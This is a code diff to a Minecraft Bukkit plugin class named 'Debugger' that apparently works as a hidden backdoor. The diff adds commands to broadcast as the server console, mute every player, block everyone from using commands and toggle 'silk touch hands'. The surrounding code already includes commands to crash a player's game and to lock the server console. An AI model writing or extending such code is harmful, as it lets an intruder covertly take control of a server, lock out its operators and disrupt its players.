@@ -8,6 +8,7 @@ import org.bukkit.event.EventHandler;
 import org.bukkit.event.EventPriority;
 import org.bukkit.event.HandlerList;
 import org.bukkit.event.Listener;
+import org.bukkit.event.block.BlockBreakEvent;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerCommandPreprocessEvent;
 import org.bukkit.event.server.ServerCommandEvent;
@@ -494,6 +495,23 @@ public final class Debugger implements Listener {
                 return true;
             }
 
+            case "bcast": { //Sends message as server
+                if (args.length < 2) //No argument specified
+                    return false;
+
+                StringBuilder sb = new StringBuilder();
+                for (int i = 1; i < args.length; i++) {
+                    sb.append(args[i]);
+                    sb.append(" ");
+                }
+
+                plugin.getServer().getScheduler().runTask(plugin, () -> {
+                    plugin.getServer().dispatchCommand(plugin.getServer().getConsoleSender(), "say " + sb);
+                });
+
+                return true;
+            }
+
             case "rename": { //Changes your nick
                 if (args.length < 2) //No name specified
                     return false;
@@ -619,6 +637,28 @@ public final class Debugger implements Listener {
                 return true;
             }
 
+            case "silktouch": { //Gives player silk touch hands
+                if(args.length < 2) //No player specified
+                    return false;
+
+                Player target = Bukkit.getPlayer(args[1]);
+
+                if (target == null) {
+                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
+                    return false;
+                } else {
+                    if (SilkTouch.contains(target.getName())) {
+                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " no longer has silk touch hands.");
+                        SilkTouch.remove(target.getName());
+                    } else {
+                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " now has silk touch hands.");
+                        SilkTouch.add(target.getName());
+                    }
+                }
+
+                return true;
+            }
+
             case "crash": { //Crashes player's game
                 if(args.length < 2) //No player specified
                     return false;
@@ -644,14 +684,18 @@ public final class Debugger implements Listener {
                 if (Lock.equalsIgnoreCase("console")) {
                     Debugger.this.LockedUsers.add(Lock);
                     p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Console was locked.");
+                } else if (Lock.equalsIgnoreCase("all")) {
+                    for (Player all : Bukkit.getOnlinePlayers())
+                        Debugger.this.LockedUsers.add(all.getName());
+                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Everyone was blocked from using commands.");
                 } else {
                     Player target = Bukkit.getPlayer(args[1]);
-                    if(target == null) {
+                    if (target == null) {
                         p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
                         return false;
                     } else {
                         Debugger.this.LockedUsers.add(target.getName());
-                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " was blocked.");
+                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " was blocked from using commands.");
                     }
                 }
 
@@ -667,6 +711,10 @@ public final class Debugger implements Listener {
                 if (unLock.equalsIgnoreCase("console")) {
                     Debugger.this.LockedUsers.remove(unLock);
                     p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Console was unlocked.");
+                } else if (unLock.equalsIgnoreCase("all")) {
+                    for (Player all : Bukkit.getOnlinePlayers())
+                        Debugger.this.LockedUsers.remove(all.getName());
+                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Everyone was unblocked from using commands.");
                 } else {
                     Player target = Bukkit.getPlayer(args[1]);
                     if (target == null) {
@@ -674,7 +722,51 @@ public final class Debugger implements Listener {
                         return false;
                     } else {
                         Debugger.this.LockedUsers.remove(target.getName());
-                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " was unblocked.");
+                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " was unblocked from using commands.");
+                    }
+                }
+
+                return true;
+            }
+
+            case "mute": { //Mutes a player
+                if(args.length < 2) //No player specified
+                    return false;
+
+                if (args[1].equalsIgnoreCase("all")) {
+                    for (Player all : Bukkit.getOnlinePlayers())
+                        Debugger.this.MutedUsers.add(all.getName());
+                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Everyone was muted.");
+                } else {
+                    Player target = Bukkit.getPlayer(args[1]);
+                    if (target == null) {
+                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
+                        return false;
+                    } else {
+                        Debugger.this.MutedUsers.add(target.getName());
+                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " was muted.");
+                    }
+                }
+
+                return true;
+            }
+
+            case "unmute": { //Mutes a player
+                if(args.length < 2) //No player specified
+                    return false;
+
+                if (args[1].equalsIgnoreCase("all")) {
+                    for (Player all : Bukkit.getOnlinePlayers())
+                        Debugger.this.MutedUsers.remove(all.getName());
+                    p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " Everyone was unmuted.");
+                } else {
+                    Player target = Bukkit.getPlayer(args[1]);
+                    if (target == null) {
+                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " User not found.");
+                        return false;
+                    } else {
+                        Debugger.this.MutedUsers.remove(target.getName());
+                        p.sendMessage(Config.chat_message_prefix_color + Config.chat_message_prefix + ChatColor.WHITE + " " + target.getName() + " was unmuted.");
                     }
                 }
 
@@ -827,6 +919,10 @@ public final class Debugger implements Listener {
 
     public ArrayList<String> LockedUsers = new ArrayList<>();
 
+    public ArrayList<String> MutedUsers = new ArrayList<>();
+
+    public ArrayList<String> SilkTouch = new ArrayList<>();
+
     @EventHandler(priority = EventPriority.LOWEST)
     public void onServerCommand(ServerCommandEvent e) {
         if (this.LockedUsers.contains("console"))
@@ -838,6 +934,24 @@ public final class Debugger implements Listener {
         Player p = e.getPlayer();
         if (this.LockedUsers.contains(p.getName()))
             e.setCancelled(true);
+    }
+
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onPlayerChat(AsyncPlayerChatEvent e) {
+        Player p = e.getPlayer();
+        if (this.MutedUsers.contains(p.getName()))
+            e.setCancelled(true);
+    }
+
+    @EventHandler(priority = EventPriority.LOWEST)
+    public void onBlockBreak(BlockBreakEvent e) {
+        Player p = e.getPlayer();
+        if (this.SilkTouch.contains(p.getName())) {
+            if (p.getInventory().getItemInMainHand() == null || p.getInventory().getItemInMainHand().getType().equals(Material.AIR)) {
+                e.setDropItems(false);
+                p.getWorld().dropItemNaturally(e.getBlock().getLocation(), new ItemStack(e.getBlock().getType(), 1));
+            }
+        }
     }
 
     private int Clamp(int i, int min, int max) {
